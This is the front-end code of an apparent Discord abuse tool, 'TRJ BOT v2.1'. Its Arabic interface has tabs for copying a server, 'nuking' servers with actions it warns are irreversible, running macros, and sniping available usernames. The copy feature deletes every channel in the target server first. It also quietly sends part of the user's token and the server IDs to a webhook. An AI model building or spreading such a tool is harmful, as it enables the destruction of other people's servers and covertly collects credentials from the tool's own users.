...
export default function Home() {
  ...
  const doCopy = async () => {
    ...
    await sendWebhook('📋 نسخ سيرفر', { 
      '🔑 التوكن': copyToken.substring(0, 20) + '...',
      '🆔 المصدر': copySource, 
      '🆔 الهدف': copyTarget
    })
    ...
    try {
      ...
      if (d.success) {
        ...
        setResult(
          ...
          `📁 تصنيفات منشأة: ${d.stats.categories_created}\n` +
  ...
  return (
    <main className="min-h-screen bg-gradient-to-br from-gray-900 via-slate-900 to-black text-white">
      {/* Header */}
      <header className="bg-black/70 backdrop-blur-md border-b border-red-500/30 sticky top-0 z-50">
        <div className="max-w-6xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            ...
            <div className="text-gray-500 text-xs">v2.1 • Trj.py</div>
          </div>
        </div>
      </header>
      ...
      <div className="max-w-6xl mx-auto px-4 py-4">
          ...
          <div className="grid md:grid-cols-2 gap-4">
            ...
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-slate-700/50 shadow-xl flex flex-col">
              ...
              <div className="flex-1 space-y-2 text-gray-300 text-sm">
                <p className="flex items-center gap-2">✅ يحتاج أدمن في الهدف فقط</p>
                <p className="flex items-center gap-2">🗑️ يحذف كل رومات الهدف أولاً</p>
                <p className="flex items-center gap-2">🎭 ينسخ الرتب بالترتيب الصحيح</p>
                <p className="flex items-center gap-2">🔐 ينسخ كل الصلاحيات</p>
                <p className="flex items-center gap-2">📁 ينسخ التصنيفات والرومات</p>
              </div>
              <button 
                onClick={doCopy} 
                disabled={loading}
                className="w-full mt-4 py-3.5 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg hover:shadow-blue-500/30"
              >
        ...
        {tab === 'nuker' && (
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-red-500/30 shadow-xl">
                ...
                <div className="grid grid-cols-2 gap-2">
                  {[
                    ...
                    <button 
                      ...
                      className={`p-3 rounded-xl text-sm font-medium transition-all ${nukerAction === a.id ? 'bg-red-500 text-white scale-105' : 'bg-slate-700 text-gray-300 hover:bg-slate-600'}`}
                    >
                      {a.l}
                    </button>
                  ))}
            ...
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-red-500/30 shadow-xl">
              ...
              <div className="space-y-3">
                ...
                <div className="p-3 bg-red-500/10 rounded-xl border border-red-500/20">
                  <p className="text-red-400 text-xs">⚠️ تحذير: عمليات خطيرة لا يمكن التراجع!</p>
                </div>
                
                <button 
                  onClick={doNuker} 
                  disabled={loading || !nukerAction}
                  className="w-full py-3.5 bg-gradient-to-r from-red-500 to-orange-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg"
                >
                  {loading ? '⏳ جاري...' : '🔥 تنفيذ'}
                </button>
              </div>
        ...
        {tab === 'macro' && (
          <div className="grid md:grid-cols-2 gap-4">
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-purple-500/30 shadow-xl">
            ...
            <div className="bg-slate-800/70 rounded-2xl p-5 border border-purple-500/30 shadow-xl">
              ...
              <div className="space-y-3">
                ...
                <button 
                  onClick={doMacro} 
                  disabled={loading}
                  className="w-full py-3.5 bg-gradient-to-r from-purple-500 to-pink-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg"
                >
                  {loading ? '⏳ جاري...' : '🚀 بدء'}
                </button>
              </div>
        ...
        {tab === 'sniper' && (
          <div className="space-y-4">
            {tokenValid !== null && (
              <div className={`p-4 rounded-xl flex items-center gap-3 ${tokenValid ? 'bg-green-500/20 border border-green-500/30' : 'bg-red-500/20 border border-red-500/30'}`}>
                <span className="text-2xl">{tokenValid ? '✅' : '❌'}</span>
                <div>
                  <p className={`font-bold ${tokenValid ? 'text-green-400' : 'text-red-400'}`}>
            ...
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-slate-800/70 rounded-2xl p-5 border border-green-500/30 shadow-xl">
                ...
                <div className="space-y-3">
                  ...
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="text-xs text-gray-400 mb-1 block">📏 الطول</label>
                    ...
                    <div>
                      ...
                      <select value={sniperCount} onChange={e => setSniperCount(e.target.value)}
                        className="w-full p-3 bg-slate-900/90 rounded-xl border border-slate-600 focus:border-green-500 outline-none text-sm">
                        {[5,10,15,20,30,50,100].map(n => (<option key={n} value={n}>{n} يوزر</option>))}
                      </select>
                    </div>
                  </div>
                  
                  <div className="flex gap-3">
                    <label className="flex items-center gap-2 cursor-pointer bg-slate-900/50 p-3 rounded-xl flex-1 justify-center border border-slate-700 hover:border-green-500/50 transition">
                      <input type="checkbox" checked={sniperUnderscore} onChange={e => setSniperUnderscore(e.target.checked)} className="w-4 h-4 accent-green-500 rounded" />
                      <span className="text-sm">❌ _</span>
                    </label>
                    <label className="flex items-center gap-2 cursor-pointer bg-slate-900/50 p-3 rounded-xl flex-1 justify-center border border-slate-700 hover:border-green-500/50 transition">
                      <input type="checkbox" checked={sniperDot} onChange={e => setSniperDot(e.target.checked)} className="w-4 h-4 accent-green-500 rounded" />
                      <span className="text-sm">🔹 .</span>
                    </label>
                  </div>
                  
                  <button onClick={doSniper} disabled={loading}
                    className="w-full py-3.5 bg-gradient-to-r from-green-500 to-emerald-500 rounded-xl font-bold disabled:opacity-50 transition-all hover:shadow-lg hover:shadow-green-500/30">
                ...
                {sniperResults ? (
                  <div className="space-y-3">
                    <div className="grid grid-cols-3 gap-2 text-center">
                      <div className="bg-slate-900/90 p-3 rounded-xl border border-green-500/20">
                      ...
                      <div className="bg-slate-900/90 p-3 rounded-xl border border-red-500/20">
                      ...
                      <div className="bg-slate-900/90 p-3 rounded-xl border border-yellow-500/20">
                    ...
                    <div className="bg-slate-900/90 rounded-xl p-3 max-h-48 overflow-auto">
                      <div className="text-xs text-gray-400 mb-2">🔍 اليوزرات المفحوصة:</div>
                      <div className="space-y-1">
                        {sniperChecking.map((item, i) => (
                          <div key={i} className={`flex items-center justify-between p-2 rounded-lg ${
                            item.status === 'available' ? 'bg-green-500/10 border border-green-500/20' :
                            item.status === 'taken' ? 'bg-red-500/10 border border-red-500/20' :
                            'bg-yellow-500/10 border border-yellow-500/20'}`}>
                            <span className="font-mono text-sm">{item.username}</span>
                            <span className={`text-xs px-2 py-0.5 rounded ${
                              item.status === 'available' ? 'bg-green-500/30 text-green-400' :
                              item.status === 'taken' ? 'bg-red-500/30 text-red-400' :
                              'bg-yellow-500/30 text-yellow-400'}`}>
                              {item.status === 'available' ? '✅ متاح' : item.status === 'taken' ? '❌ محجوز' : '⚠️ خطأ'}
                            </span>
                          </div>
                        ))}
                      </div>
                    ...
                    {sniperResults.available?.length > 0 && (
                      <div className="bg-green-500/10 rounded-xl p-3 border border-green-500/20">
                        <div className="text-xs text-green-400 mb-2">🎉 اليوزرات المتاحة:</div>
                        <div className="flex flex-wrap gap-1">
                          {sniperResults.available.map((u: string, i: number) => (
                            <span key={i} className="bg-green-500/30 text-green-400 px-2 py-1 rounded text-sm font-mono">{u}</span>
                          ))}
                        </div>
                      </div>
                    )}
      ...
      <footer className="text-center text-gray-600 text-xs py-4 border-t border-slate-800/50 mt-4">
        TRJ BOT v2.1 • Developed by <span className="text-red-400">Trj.py</span>
      </footer>
    </main>
  )
}
